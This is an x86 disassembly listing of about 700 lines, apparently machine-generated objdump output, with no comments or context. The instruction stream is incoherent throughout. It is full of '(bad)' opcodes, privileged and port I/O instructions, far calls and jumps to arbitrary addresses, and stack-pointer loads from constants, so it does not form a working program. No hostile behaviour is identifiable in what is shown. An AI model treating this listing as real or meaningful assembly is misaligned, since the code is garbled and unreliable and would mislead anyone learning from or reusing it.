  43085c:	mov    ebp,DWORD PTR [eax-0x8]
  43085f:	add    bl,0x0
  430862:	(bad)  
  430863:	cmp    eax,ecx
  430865:	or     BYTE PTR [edx+0x750114],al
  43086b:	inc    DWORD PTR [ebp+0x18]
  43086e:	mov    eax,DWORD PTR [ebp-0x8]
  430871:	mov    ebx,eax
  430873:	(bad)  
  430874:	retf   
  430875:	inc    ebp
  430876:	into   
  430877:	mov    esi,eax
  430879:	int3   
  43087a:	scas   eax,DWORD PTR es:[edi]
  43087b:	push   es
  43087c:	mov    esi,DWORD PTR [ebp-0xc]
  43087f:	call   DWORD PTR [ebp+0x18]
  430882:	sub    edi,DWORD PTR [ebp+0x3b]
  430885:	mov    esi,DWORD PTR [edi-0x34]
  430888:	mov    eax,DWORD PTR [ebp-0x8]
  43088b:	xor    eax,0xc7c69cc3
  430890:	mov    esp,0x8b8500dc
  430895:	clc    
  430896:	mov    esp,0x338b4d45
  43089b:	in     al,0x33
  43089d:	ret    
  43089e:	add    eax,esi
  4308a0:	add    eax,DWORD PTR [ebp+0xf]
  4308a3:	mov    eax,ecx
  4308a5:	in     al,0x4d
  4308a7:	ret    
  4308a8:	mov    eax,esi
  4308aa:	in     al,dx
  4308ab:	inc    ebp
  4308ac:	rol    edi,1
  4308ae:	sar    al,1
  4308b0:	or     BYTE PTR [ebp+0x45e9f845],al
  4308b6:	add    BYTE PTR [ebx],bh
  4308b8:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4308bf:	test   ebx,eax
  4308c1:	clc    
  4308c2:	retf   
  4308c3:	inc    ebp
  4308c4:	into   
  4308c5:	cmp    esi,eax
  4308c7:	pushf  
  4308c8:	scas   eax,DWORD PTR es:[edi]
  4308c9:	(bad)  
  4308ca:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4308d1:	inc    ebp
  4308d2:	cmp    edi,DWORD PTR [edi]
  4308d4:	ja     0x430872
  4308d6:	mov    eax,edi
  4308d8:	mov    esp,0x458567a8
  4308dd:	clc    
  4308de:	mov    eax,DWORD PTR [ebp-0x8]
  4308e1:	mov    eax,ebx
  4308e3:	in     al,dx
  4308e4:	retf   
  4308e5:	ret    
  4308e6:	into   
  4308e7:	mov    dh,0x7d
  4308ea:	scas   eax,DWORD PTR es:[edi]
  4308eb:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4308f1:	add    BYTE PTR [ebx],ch
  4308f3:	jmp    0xba0a33
  4308f8:	mov    eax,DWORD PTR [ebp-0x5c]
  4308fb:	mov    eax,DWORD PTR [ebp-0x14]
  4308fe:	inc    ebp
  4308ff:	enter  0x458b,0xf8
  430903:	xor    eax,ebx
  430905:	add    ecx,ebx
  430907:	cmp    ecx,esi
  430909:	shufps xmm7,xmm4,0xaf
  43090d:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430913:	dec    ebp
  430914:	sub    esi,DWORD PTR [ebx]
  430916:	cmp    esi,DWORD PTR [ebx]
  430918:	ja     0x43091d
  43091a:	mov    eax,DWORD PTR [ebx]
  43091c:	lods   al,BYTE PTR ds:[esi]
  43091d:	mov    db0,ecx
  430920:	inc    ebp
  430921:	dec    ebp
  430922:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430928:	retf   
  430929:	rol    dh,1
  43092b:	or     al,0xce
  43092d:	inc    ebp
  43092e:	scas   eax,DWORD PTR es:[edi]
  43092f:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430935:	add    BYTE PTR [ebx],ch
  430937:	add    BYTE PTR [ebx],bh
  430939:	inc    ebp
  43093a:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430940:	inc    ebp
  430941:	retf   
  430942:	mov    ecx,esi
  430944:	clc    
  430945:	(bad)  
  430946:	retf   
  430947:	scas   eax,DWORD PTR es:[edi]
  430948:	ret    
  430949:	mov    ecx,esi
  43094b:	hlt    
  43094c:	(bad)  
  43094d:	push   ebp
  43094e:	scas   eax,DWORD PTR es:[edi]
  43094f:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430955:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  43095b:	add    BYTE PTR [ebx],al
  43095d:	mov    eax,eax
  43095f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430960:	inc    ebp
  430961:	dec    ebp
  430962:	xor    eax,0x89339c33
  430967:	add    edx,eax
  430969:	add    eax,DWORD PTR [ebp+0xf]
  43096c:	xor    al,0xc1
  43096e:	pushf  
  43096f:	dec    ebp
  430970:	(bad)  
  430971:	mov    esi,DWORD PTR [eax-0x72e7a14]
  430977:	rol    BYTE PTR [ebp+0x5],1
  43097a:	xor    eax,DWORD PTR [ebp+0x3]
  43097d:	jmp    0x43096a
  43097f:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430985:	xor    eax,DWORD PTR [ebp+0x33]
  430988:	mov    eax,DWORD PTR [ebx]
  43098a:	rol    BYTE PTR [ebx],1
  43098c:	test   BYTE PTR [edi],cl
  43098e:	call   0xb8b:0x884d32c1
  430995:	in     al,dx
  430996:	inc    ebp
  430997:	shl    DWORD PTR [ebx],1
  430999:	rol    BYTE PTR [ebx],1
  43099b:	add    eax,0xeb4d45e0
  4309a0:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  4309a6:	add    BYTE PTR [ebx],dh
  4309a8:	inc    ebp
  4309a9:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  4309af:	rdpmc  
  4309b1:	rol    DWORD PTR [ebx],0x4d
  4309b4:	loopne 0x430941
  4309b6:	push   ebp
  4309b7:	in     al,dx
  4309b8:	mov    cl,dl
  4309ba:	adc    eax,edx
  4309bc:	jb     0x4309c3
  4309be:	add    BYTE PTR [ebp+0x45],al
  4309c1:	jmp    0x43094e
  4309c3:	mov    ebx,eax
  4309c5:	test   al,0xcb
  4309c7:	dec    ebp
  4309c8:	dec    ebp
  4309c9:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  4309cf:	add    ebx,DWORD PTR [edx-0x743ecdf1]
  4309d5:	dec    ebp
  4309d6:	mov    al,0x8b
  4309d8:	dec    ebp
  4309d9:	in     al,dx
  4309da:	xor    edx,ecx
  4309dc:	xor    edx,eax
  4309de:	add    eax,DWORD PTR [ebp+0x3]
  4309e1:	jbe    0x4309f2
  4309e3:	mov    eax,ecx
  4309e5:	test   al,0x45
  4309e7:	dec    ebp
  4309e8:	mov    DWORD PTR [ebx],esi
  4309ea:	loopne 0x430a1f
  4309ec:	inc    ebp
  4309ed:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  4309f3:	rol    esi,0x45
  4309f6:	scas   eax,DWORD PTR es:[edi]
  4309f7:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  4309fd:	mov    eax,ecx
  4309ff:	hlt    
  430a00:	dec    ebp
  430a01:	inc    ebp
  430a02:	mov    eax,edi
  430a04:	loopne 0x4309de
  430a06:	retf   
  430a07:	test   esi,ecx
  430a09:	clc    
  430a0a:	scas   eax,DWORD PTR es:[edi]
  430a0b:	inc    ebp
  430a0c:	mov    eax,edi
  430a0e:	fdiv   st,st(0)
  430a10:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430a16:	call   0xf8b:0x3b9c323b
  430a1d:	fcomp  DWORD PTR [esi-0x3d]
  430a20:	inc    esi
  430a22:	mov    ebp,DWORD PTR [eax-0x10]
  430a25:	inc    ebp
  430a26:	dec    ebp
  430a27:	xor    esi,DWORD PTR [ebx]
  430a29:	add    eax,DWORD PTR [ebx]
  430a2b:	loopne 0x430a3c
  430a2d:	dec    ebp
  430a2e:	ror    DWORD PTR [edx+0x7233084d],0x3
  430a35:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430a3b:	lock call 0xf48b:0x894532c3
  430a43:	rol    BYTE PTR [ebp-0x7c],1
  430a46:	xor    ebx,DWORD PTR [edx-0x7772cd47]
  430a4c:	call   edi
  430a4e:	enter  0x4d45,0x8b
  430a52:	mov    esi,eax
  430a54:	fmul   st(3),st
  430a56:	push   ebp
  430a57:	dec    ebp
  430a58:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430a5e:	ret    0xc19a
  430a61:	xor    al,BYTE PTR [esi-0x280276]
  430a67:	dec    ebp
  430a68:	jne    0x430a9d
  430a6a:	mov    eax,DWORD PTR [ebx]
  430a6c:	cld    
  430a6d:	loopne 0x430a1f
  430a6f:	push   ebp
  430a70:	add    DWORD PTR [eax+0x72851100],ecx
  430a76:	inc    DWORD PTR [eax]
  430a78:	inc    DWORD PTR [ebp-0x75]
  430a7b:	mov    edi,esp
  430a7d:	lock add bl,0x1
  430a81:	retf   
  430a82:	add    dh,al
  430a84:	xor    dh,cl
  430a86:	inc    ebp
  430a87:	scas   eax,DWORD PTR es:[edi]
  430a88:	mov    eax,DWORD PTR [ebx]
  430a8a:	shl    al,0x0
  430a8d:	inc    ebp
  430a8e:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430a94:	call   0x461ccc
  430a99:	ud0    eax,ecx
  430a9c:	adc    al,0x4d
  430a9e:	inc    ebp
  430a9f:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430aa5:	lock push 0x338055
  430aab:	add    eax,DWORD PTR [eax]
  430aad:	ud0    ecx,edx
  430ab0:	sbb    BYTE PTR [ebp+0x5e],dl
  430ab3:	xor    ecx,ecx
  430ab5:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430abc:	push   ecx
  430abd:	add    BYTE PTR [ebp-0x38],cl
  430ac0:	mov    DWORD PTR [esi-0x740004],eax
  430ac6:	cld    
  430ac7:	inc    ebp
  430ac8:	xchg   ebx,eax
  430ac9:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  430acf:	xabort 0xaf
  430ad2:	icebp  
  430ad3:	mov    esi,DWORD PTR [ebp-0x28]
  430ad6:	(bad)  
  430ad7:	retf   
  430ad8:	or     ecx,eax
  430ada:	(bad)  
  430adb:	dec    ebp
  430adc:	pop    es
  430add:	(bad)  
  430ade:	(bad)  
  430adf:	or     BYTE PTR [esi],al
  430ae1:	jb     0x430aa9
  430ae3:	add    BYTE PTR [ebx],al
  430ae5:	inc    ebp
  430ae6:	(bad)  
  430ae7:	mov    ecx,DWORD PTR [edx]
  430ae9:	fadd   st(6),st
  430aeb:	ret    
  430aec:	add    ah,BYTE PTR [esi-0x37]
  430aef:	int    0x55
  430af1:	sub    ebp,esp
  430af3:	add    edx,DWORD PTR [ecx-0x14]
  430af6:	inc    ebp
  430af7:	inc    ebp
  430af8:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430afe:	cld    
  430aff:	(bad)  
  430b00:	(bad)  
  430b01:	scas   eax,DWORD PTR es:[edi]
  430b02:	loopne 0x430b3f
  430b04:	mov    DWORD PTR [edi],ecx
  430b06:	mov    ebp,ebp
  430b08:	clc    
  430b09:	push   eax
  430b0b:	push   DWORD PTR [ebp-0x4]
  430b0e:	mov    BYTE PTR [ebp+0xa],0xff
  430b12:	(bad)  
  430b13:	int3   
  430b14:	or     BYTE PTR [eax],al
  430b16:	(bad)  
  430b17:	lea    eax,[edi]
  430b19:	ins    BYTE PTR es:[edi],dx
  430b1a:	(bad)  
  430b1b:	inc    DWORD PTR [ecx]
  430b1d:	push   eax
  430b1e:	mov    BYTE PTR [ebp+0x9],0x8b
  430b22:	leave  
  430b23:	les    edx,FWORD PTR [ebp+0x0]
  430b26:	in     al,dx
  430b27:	call   DWORD PTR [ecx-0x75]
  430b2a:	inc    ebp
  430b2b:	cld    
  430b2c:	mov    DWORD PTR [eax+0x8b01fc],eax
  430b32:	cld    
  430b33:	xor    BYTE PTR [esi-0x76a8f98b],bh
  430b39:	sti    
  430b3a:	mov    eax,DWORD PTR [eax]
  430b3c:	clc    
  430b3d:	test   eax,esi
  430b3f:	je     0x430bb6
  430b41:	mov    eax,esi
  430b43:	cld    
  430b44:	add    al,0x80
  430b46:	add    WORD PTR [ecx+0x0],ax
  430b4a:	fadd   DWORD PTR [eax]
  430b4c:	mov    BYTE PTR [eax],0xd4
  430b4f:	push   0xffffffc3
  430b51:	push   edi
  430b52:	mov    edx,DWORD PTR [eax+0x51]
  430b55:	pop    edi
  430b56:	lea    ebx,[ebx-0x8]
  430b59:	ret    0x45
  430b5c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430b62:	xchg   eax,edi
  430b64:	mov    DWORD PTR [ebp-0x75],ecx
  430b67:	push   esi
  430b68:	clc    
  430b69:	jne    0x430b3b
  430b6b:	mov    ecx,0xf8450b0b
  430b70:	(bad)  
  430b71:	push   cs
  430b72:	or     BYTE PTR [ebp-0x3a],dh
  430b75:	cmp    eax,DWORD PTR [ecx]
  430b77:	pop    esi
  430b78:	(bad)  
  430b79:	or     al,0x5
  430b7b:	inc    eax
  430b7c:	leave  
  430b7d:	call   0x21994d86
  430b82:	iret   
  430b83:	inc    eax
  430b84:	leave  
  430b85:	jmp    0xd8ce4c89
  430b8a:	mov    eax,DWORD PTR [edx-0x3a]
  430b8d:	jl     0x430b83
  430b8f:	inc    eax
  430b90:	nop
  430b91:	loop   0x430b92
  430b93:	ret    
  430b94:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430b9a:	add    eax,0xff45e8f8
  430b9f:	push   esi
  430ba0:	push   DWORD PTR [ebp-0x39]
  430ba3:	mov    eax,0x7e9da46
  430ba8:	or     al,0x6
  430baa:	push   DWORD PTR [ebp-0x3a]
  430bad:	cmp    eax,DWORD PTR [edx]
  430baf:	pop    esi
  430bb0:	ret    
  430bb1:	or     al,0x56
  430bb3:	inc    ecx
  430bb4:	push   ebp
  430bb5:	jl     0x430ba3
  430bb7:	inc    edx
  430bb8:	inc    ebp
  430bb9:	leave  
  430bba:	add    DWORD PTR [ecx+0x28],eax
  430bbd:	and    esp,edi
  430bbf:	inc    ecx
  430bc0:	jne    0x430ba9
  430bc2:	add    DWORD PTR [edx+0x1c],eax
  430bc5:	enter  0xc38b,0x14
  430bc9:	mov    edx,DWORD PTR [edx-0x17275af]
  430bcf:	clc    
  430bd0:	enter  0xd345,0x56
  430bd4:	div    DWORD PTR [ebp+0x50]
  430bd7:	mov    eax,0x7c80ece
  430bdc:	rol    DWORD PTR [esi],cl
  430bde:	div    DWORD PTR [ebp+0x50]
  430be1:	cmp    ecx,edx
  430be3:	pop    esi
  430be4:	dec    BYTE PTR [edx]
  430be6:	in     al,dx
  430be7:	inc    edx
  430be8:	sub    ebp,ebp
  430bea:	inc    eax
  430beb:	(bad)  
  430bec:	push   eax
  430bed:	add    edx,DWORD PTR [eax-0x13]
  430bf0:	push   edi
  430bf1:	add    dh,dh
  430bf3:	leave  
  430bf4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430bf8:	add    BYTE PTR [ecx+0x0],dl
  430bfb:	inc    ebp
  430bfc:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430c02:	add    BYTE PTR [eax-0x7fbf448],bh
  430c08:	add    al,0x2
  430c0a:	jmp    0x57eb764
  430c0f:	jne    0x430bf9
  430c11:	mov    eax,DWORD PTR [edx]
  430c13:	or     BYTE PTR [eax],al
  430c15:	inc    ecx
  430c16:	stc    
  430c17:	jmp    0xe7824c52
  430c1c:	jge    0x430c5f
  430c1e:	mov    esi,ebp
  430c20:	lock ret 0x7d
  430c24:	and    ecx,DWORD PTR [ebx-0x171777]
  430c2a:	add    bh,bh
  430c2c:	aad    0xd7
  430c2e:	add    dh,cl
  430c30:	clts   
  430c32:	(bad)  
  430c33:	call   0xffce0b38
  430c38:	hlt    
  430c39:	iret   
  430c3a:	jge    0x430c12
  430c3c:	rol    DWORD PTR [esi-0x80],cl
  430c3f:	cmc    
  430c40:	or     BYTE PTR [edi-0x27],cl
  430c43:	(bad)  
  430c44:	out    dx,al
  430c45:	mov    eax,DWORD PTR [ebx]
  430c47:	(bad)  
  430c48:	pop    esi
  430c49:	push   es
  430c4a:	cmp    al,0xe8
  430c4c:	sar    edi,0x8
  430c4f:	inc    DWORD PTR [edi]
  430c51:	inc    esi
  430c52:	(bad)  
  430c53:	loop   0x430cd3
  430c55:	push   edi
  430c56:	push   cs
  430c57:	push   ebx
  430c58:	add    BYTE PTR [ebx+0x24008b56],cl
  430c5e:	add    BYTE PTR [ebp+0x50],al
  430c61:	push   eax
  430c62:	add    DWORD PTR [ebx+0x757d1834],ecx
  430c68:	sub    edx,DWORD PTR [esi-0x24]
  430c6b:	jne    0x430c23
  430c6d:	lods   eax,DWORD PTR ds:[esi]
  430c6e:	mov    edx,DWORD PTR [edx-0x34]
  430c71:	dec    esi
  430c72:	out    0x83,eax
  430c74:	into   
  430c75:	push   edi
  430c77:	loopne 0x430c47
  430c79:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430c7d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430c84:	rol    DWORD PTR [edx],0x8
  430c87:	mov    esp,ecx
  430c89:	cmp    DWORD PTR [ebx],0xc
  430c8c:	mov    esi,0x5001c0
  430c91:	push   eax
  430c92:	push   cs
  430c93:	push   eax
  430c94:	(bad)  
  430c95:	sub    edx,edi
  430c97:	push   esi
  430c98:	adc    al,0xcb
  430c9a:	ins    DWORD PTR es:[edi],dx
  430c9b:	mov    eax,0x203e8
  430ca0:	add    al,ah
  430ca2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430ca9:	add    dh,al
  430cab:	add    ah,ch
  430cad:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430cb3:	pop    ecx
  430cb4:	or     eax,ebx
  430cb6:	cli    
  430cb7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430cbd:	lea    ebp,[ebx]
  430cbf:	mov    edx,DWORD PTR [edx-0x4]
  430cc2:	dec    ecx
  430cc3:	inc    ebp
  430cc4:	shr    BYTE PTR [ebx],0x4b
  430cc7:	and    al,0x0
  430cc9:	(bad)  
  430cca:	jne    0x430d11
  430ccc:	pop    eax
  430ccd:	mov    al,0x5a
  430ccf:	call   0x1420f2e
  430cd4:	and    al,0x85
  430cd6:	push   edx
  430cd7:	add    BYTE PTR [eax+eax*1+0x0],ah
  430cdb:	dec    ebp
  430cdc:	mov    cl,0x23
  430cde:	jmp    0x430ccc
  430ce0:	mov    al,0xe7
  430ce2:	call   0x1390fd0
  430ce7:	shr    DWORD PTR [eax+ebx*2],cl
  430cea:	lock (bad) 
  430cec:	adc    eax,0x757f008d
  430cf1:	out    0x58,eax
  430cf3:	cmp    al,0x7
  430cf5:	pop    edx
  430cf6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430cfd:	push   ecx
  430cfe:	cld    
  430cff:	mov    esi,0x3b0175
  430d04:	and    al,0xb0
  430d06:	xor    BYTE PTR [edx+0x1],0x8b
  430d0a:	add    ah,bh
  430d0c:	mov    edi,DWORD PTR [ebp-0x4]
  430d0f:	psubsw mm7,QWORD PTR [edi]
  430d12:	add    DWORD PTR [ebp+0x0],ebp
  430d15:	rcr    eax,1
  430d17:	mov    edi,ecx
  430d19:	and    eax,DWORD PTR [eax]
  430d1b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430d21:	call   0x130100a
  430d26:	add    al,cl
  430d28:	mov    ebp,esi
  430d2a:	aam    0x83
  430d2c:	or     DWORD PTR [ecx],eax
  430d2e:	jne    0x430d21
  430d30:	mov    eax,DWORD PTR [eax]
  430d32:	aam    0x0
  430d34:	dec    ebp
  430d35:	jne    0x430cc2
  430d37:	cmp    ebx,eax
  430d39:	jb     0x430d88
  430d3b:	jmp    0x430cc8
  430d3d:	mov    ebx,esp
  430d3f:	int3   
  430d40:	dec    ebp
  430d41:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430d48:	mov    edx,0x8b0a8b
  430d4d:	cmp    ecx,DWORD PTR [eax]
  430d4f:	jb     0x430d28
  430d51:	pop    edx
  430d52:	push   edi
  430d53:	cli    
  430d54:	pop    es
  430d55:	mov    eax,ecx
  430d57:	jb     0x430d5b
  430d59:	add    DWORD PTR [ebx],0xa
  430d5c:	mov    eax,DWORD PTR [ebx]
  430d5e:	int3   
  430d5f:	add    bh,BYTE PTR [esi+0x75d10006]
  430d65:	jmp    0x430cf2
  430d67:	mov    al,0xe8
  430d69:	call   0x1040feb
  430d6e:	add    edx,DWORD PTR [ecx+ecx*8]
  430d71:	pop    edi
  430d72:	or     BYTE PTR [ecx-0x73],bl
  430d75:	pop    ecx
  430d76:	inc    edi
  430d77:	xor    al,0xeb
  430d79:	push   ecx
  430d7a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430d80:	call   0xb20e85
  430d85:	int3   
  430d86:	sbb    BYTE PTR [esi],ch
  430d88:	inc    ebp
  430d89:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430d8f:	call   0x9c0ffe
  430d94:	or     BYTE PTR [ebx-0x73],dl
  430d97:	cmp    al,0x47
  430d99:	mov    al,0x1
  430d9b:	jb     0x430d9d
  430d9d:	mov    al,0x10
  430d9f:	push   eax
  430da0:	add    al,0x75
  430da2:	add    BYTE PTR [ebx],ch
  430da4:	add    ebx,esp
  430da6:	int3   
  430da7:	jne    0x430db9
  430da9:	movsx  edx,cl
  430dac:	add    DWORD PTR [eax],eax
  430dae:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430db5:	mov    gs,edi
  430db7:	add    BYTE PTR [eax-0x50],ch
  430dba:	add    al,ch
  430dbc:	mov    eax,DWORD PTR [ecx]
  430dbe:	sub    eax,DWORD PTR [eax]
  430dc0:	jb     0x430e37
  430dc2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430dc6:	jge    0x430db0
  430dc8:	add    al,0x1
  430dca:	add    DWORD PTR [eax],0x0
  430dcd:	jne    0x430dcf
  430dcf:	je     0x430e16
  430dd1:	mov    eax,DWORD PTR [edi]
  430dd3:	ror    BYTE PTR [ebp+0x4d],1
  430dd6:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430ddd:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430de3:	mov    DWORD PTR [ebx],ebp
  430de5:	fadd   DWORD PTR [eax+0x75]
  430de8:	inc    eax
  430de9:	pop    eax
  430dea:	lea    ebx,[ecx+0x4f]
  430ded:	push   0xb1000003
  430df2:	out    dx,eax
  430df3:	add    ebp,DWORD PTR [edx+edx*2]
  430df6:	add    BYTE PTR [ebx+ecx*4],bh
  430df9:	mov    ch,BYTE PTR [ebx]
  430dfb:	jb     0x430e6f
  430dfd:	add    al,0x89
  430dff:	push   eax
  430e00:	call   0x842b5b72
  430e05:	add    DWORD PTR [eax+eax*1],eax
  430e08:	jae    0x430e1e
  430e0a:	icebp  
  430e0b:	inc    ebp
  430e0c:	mov    eax,DWORD PTR gs:[ecx]
  430e0f:	int3   
  430e10:	out    dx,al
  430e11:	loopne 0x430e60
  430e13:	sub    eax,DWORD PTR [edx]
  430e15:	push   0xffffff83
  430e17:	pop    esi
  430e18:	push   cs
  430e19:	jl     0x430e34
  430e1b:	add    al,0xaf
  430e1d:	xor    eax,0x832b6d00
  430e22:	mov    eax,DWORD PTR [edx]
  430e24:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430e2a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430e30:	inc    ebp
  430e31:	shr    ebx,0x3
  430e34:	or     DWORD PTR [eax],0x4
  430e37:	push   0xffffffa5
  430e39:	pop    esi
  430e3a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430e41:	jmp    0x430ea0
  430e43:	mov    edi,0xff0272
  430e48:	fdivr  QWORD PTR [ebp+0x5d]
  430e4b:	push   0x4e
  430e4d:	pop    ecx
  430e4e:	call   0x435253
  430e53:	mov    DWORD PTR [ebx],eax
  430e55:	in     al,0xc8
  430e57:	rol    BYTE PTR [ebp-0x75],0xc1
  430e5b:	call   0xad103c
  430e60:	pop    esi
  430e61:	enter  0xceff,0x8b
  430e65:	repz mov ecx,DWORD PTR [ebp-0x34]
  430e69:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430e70:	je     0x430e72
  430e72:	or     DWORD PTR [ebx-0x74183b24],eax
  430e78:	jne    0x430e5e
  430e7a:	jmp    0x430e75
  430e7c:	push   DWORD PTR [edx-0x24]
  430e7f:	push   0x4d
  430e81:	pop    ecx
  430e82:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430e86:	jge    0x430e8e
  430e88:	mov    eax,eax
  430e8a:	sub    ebp,DWORD PTR [edx+0x24]
  430e8d:	pop    esi
  430e8e:	inc    ebp
  430e8f:	mov    esp,0x8b6077
  430e94:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430e9a:	lods   al,BYTE PTR ds:[esi]
  430e9b:	add    BYTE PTR [ebx],bh
  430e9d:	enter  0xce73,0x49
  430ea1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430ea9:	stc    
  430eaa:	jge    0x430f1e
  430eac:	jnp    0xdd42921b
  430eb2:	call   0xc60f88
  430eb7:	fadd   st(0),st
  430eb9:	dec    esi
  430eba:	ins    BYTE PTR es:[edi],dx
  430ebb:	stc    
  430ebc:	cmp    al,0x73
  430ebe:	push   ebp
  430ebf:	mov    eax,0xf8028b
  430ec4:	jne    0x430e87
  430ec6:	mov    esi,ecx
  430ec8:	mov    esp,DWORD PTR [ebp+0x2c]
  430ecb:	add    edi,DWORD PTR [ebp-0x24]
  430ece:	sub    esp,eax
  430ed0:	and    al,0x45
  430ed2:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430ed8:	sbb    al,0xee
  430eda:	pop    esi
  430edb:	call   0x830f0b
  430ee0:	fsubr  st,st(3)
  430ee2:	sti    
  430ee3:	add    BYTE PTR gs:[ecx],bh
  430ee6:	add    eax,esp
  430ee8:	add    DWORD PTR [esi],eax
  430eea:	rol    DWORD PTR [ebp+0x8],0x29
  430eee:	mov    esp,eax
  430ef0:	clc    
  430ef1:	jne    0x430f68
  430ef3:	mov    eax,0x8b0673
  430ef8:	loopne 0x430f3f
  430efa:	loopne 0x430e85
  430efc:	lods   al,BYTE PTR ds:[esi]
  430efd:	int3   
  430efe:	inc    ebp
  430eff:	mov    DWORD PTR gs:[eax+edi*8],eax
  430f03:	add    al,0xc3
  430f05:	sub    ecx,DWORD PTR [ebp+0x47]
  430f08:	(bad)  
  430f0a:	shr    BYTE PTR [ebp-0x1f],0xe8
  430f0e:	add    eax,DWORD PTR [eax]
  430f10:	call   0x644d015
  430f15:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430f1b:	dec    esi
  430f1c:	ins    DWORD PTR es:[edi],dx
  430f1d:	in     al,dx
  430f1e:	lea    eax,[eax]
  430f20:	inc    ebp
  430f21:	inc    ebp
  430f22:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430f28:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430f32:	and    al,0xdc
  430f34:	ror    DWORD PTR [edx+0x24],0xf7
  430f38:	or     BYTE PTR [ebp+0x4c],dh
  430f3b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430f3f:	stos   BYTE PTR es:[edi],al
  430f40:	adc    edx,edi
  430f42:	inc    esp
  430f43:	add    edi,DWORD PTR [eax]
  430f45:	jne    0x430f2a
  430f47:	mov    DWORD PTR [eax-0x7449db04],ecx
  430f4d:	cmp    ecx,DWORD PTR [edi]
  430f4f:	sub    BYTE PTR [ebp-0x7e],dl
  430f52:	sar    ebp,0xb
  430f55:	jmp    FWORD PTR [edi+0x2400392a]
  430f5b:	sub    esi,DWORD PTR [ebx-0x73]
  430f5e:	mov    esp,DWORD PTR [ecx+edi*4]
  430f61:	mov    ecx,DWORD PTR [eax]
  430f63:	and    BYTE PTR [eax],al
  430f65:	jne    0x430f31
  430f67:	sub    ebp,ecx
  430f69:	sbb    BYTE PTR [esi+0x32],ah
  430f6c:	dec    ebp
  430f6d:	push   ebp
  430f6e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  430f74:	ret    
  430f75:	mov    edx,ebp
  430f77:	leave  
  430f78:	sub    DWORD PTR [esi+0x24],ebx
  430f7b:	ret    0x2b
  430f7e:	pop    ax
  430f80:	push   ebp
  430f81:	rol    BYTE PTR [ebx],0xeb
  430f84:	add    DWORD PTR [ecx+0x6c0001],0x40
  430f8b:	jb     0x430fe2
  430f8d:	ret    
  430f8e:	in     al,dx
  430f8f:	jecxz  0x430f1c
  430f91:	push   esi
  430f92:	xchg   esp,eax
  430f93:	jne    0x430f95
  430f95:	cmp    edx,DWORD PTR [esi+0x1c]
  430f98:	jne    0x430f7e
  430f9a:	mov    eax,DWORD PTR [ebp-0x77]
  430f9d:	ror    DWORD PTR [ebx+0x899408],0xe0
  430fa4:	mov    esi,DWORD PTR [ebp-0x75]
  430fa7:	pop    esi
  430fa8:	nop
  430fa9:	mov    eax,DWORD PTR [eax]
  430fab:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  430fb1:	add    al,0x0
  430fb3:	inc    ebp
  430fb4:	mov    eax,DWORD PTR [ebx]
  430fb6:	mov    ebp,ebx
  430fb8:	cmp    al,0xf
  430fba:	or     al,al
  430fbc:	inc    ebp
  430fbd:	inc    ebp
  430fbe:	xor    eax,0x8bc89c8b
  430fc3:	ins    BYTE PTR es:[edi],dx
  430fc4:	cld    
  430fc5:	add    BYTE PTR [edi+0x536c16c0],dh
  430fcb:	add    BYTE PTR [ecx-0x5],dl
  430fce:	add    eax,0x17200
  430fd3:	sbb    al,0x85
  430fd5:	dec    esp
  430fd6:	je     0x431010
  430fd8:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  430fdc:	add    BYTE PTR [ebx],bh
  430fde:	(bad)  
  430fdf:	and    al,0x34
  430fe1:	jae    0x430f7f
